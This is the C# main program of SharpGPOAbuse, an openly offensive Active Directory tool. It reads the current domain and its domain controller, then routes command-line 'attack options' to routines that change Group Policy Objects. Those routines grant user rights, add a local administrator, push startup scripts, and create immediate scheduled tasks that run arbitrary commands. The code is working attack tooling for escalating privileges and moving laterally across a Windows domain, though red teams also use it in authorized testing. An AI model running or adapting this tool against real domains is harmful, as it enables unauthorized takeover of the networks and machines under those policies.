using System;
using System.DirectoryServices.ActiveDirectory;

namespace SharpGPOAbuse
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string AbuseFunction = args[0];

                string[] UserRights;
                string UserAccount;
                string ScriptName;
                string ScriptContent;
                string TaskName;
                string Author;
                string Command;
                string CommandArgs;

                string GPOName;
                bool Force = false;

                Domain currentDomain = Domain.GetCurrentDomain();
                string DomainController = currentDomain.PdcRoleOwner.Name.ToLower();
                string DomainName = currentDomain.Name.ToLower();

                string[] DCs;
                string DistinguishedName = "CN=Policies,CN=System";

                DCs = DomainName.Split('.');

                foreach (string DC in DCs)
                {
                    DistinguishedName += ",DC=" + DC;
                }

                Console.WriteLine($"[+] Domain = {DomainName}");
                Console.WriteLine($"[+] Domain Controller = {DomainController}");
                Console.WriteLine($"[+] Distinguished Name = {DistinguishedName}");

                if (AbuseFunction == "AddUserRights")
                {
                    UserRights = args[1].Split(',');
                    UserAccount = args[2];
                    GPOName = args[3];

                    UserRightAssignment.AddNewRights(DomainName, DomainController, GPOName, DistinguishedName, UserRights, UserAccount);
                }
                else if (AbuseFunction == "AddLocalAdmin")
                {
                    UserAccount = args[1];
                    GPOName = args[2];

                    if (!string.IsNullOrEmpty(args[3]))
                    {
                        if (args[3] == "Force")
                            Force = true;
                    }

                    LocalAdmin.NewLocalAdmin(UserAccount, DomainName, DomainController, GPOName, DistinguishedName, Force);
                }
                else if (AbuseFunction == "AddComputerScript")
                {
                    ScriptName = args[1];
                    ScriptContent = args[2];
                    GPOName = args[3];

                    StartupScript.NewStartupScript(ScriptName, ScriptContent, DomainName, DomainController, GPOName, DistinguishedName, "Computer");
                }
                else if (AbuseFunction == "AddUserScript")
                {
                    ScriptName = args[1];
                    ScriptContent = args[2];
                    GPOName = args[3];

                    StartupScript.NewStartupScript(ScriptName, ScriptContent, DomainName, DomainController, GPOName, DistinguishedName, "User");
                }
                else if (AbuseFunction == "AddComputerTask")
                {
                    TaskName = args[1];
                    Author = args[2];
                    Command = args[3];
                    CommandArgs = args[4];
                    GPOName = args[5];

                    if (!string.IsNullOrEmpty(args[6]))
                    {
                        if (args[6] == "Force")
                            Force = true;
                    }

                    ScheduledTask.NewImmediateTask(DomainName, DomainController, GPOName, DistinguishedName, TaskName, Author, CommandArgs, Command, Force, "Computer");
                }
                else if (AbuseFunction == "AddUserTask")
                {
                    TaskName = args[1];
                    Author = args[2];
                    Command = args[3];
                    CommandArgs = args[4];
                    GPOName = args[5];

                    if (!string.IsNullOrEmpty(args[6]))
                    {
                        if (args[6] == "Force")
                            Force = true;
                    }

                    ScheduledTask.NewImmediateTask(DomainName, DomainController, GPOName, DistinguishedName, TaskName, Author, CommandArgs, Command, Force, "User");
                }
                else
                {
                    Console.Error.WriteLine("[!] Invalid attack option");
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("[!] {0}", e.Message);
            }
        }
    }
}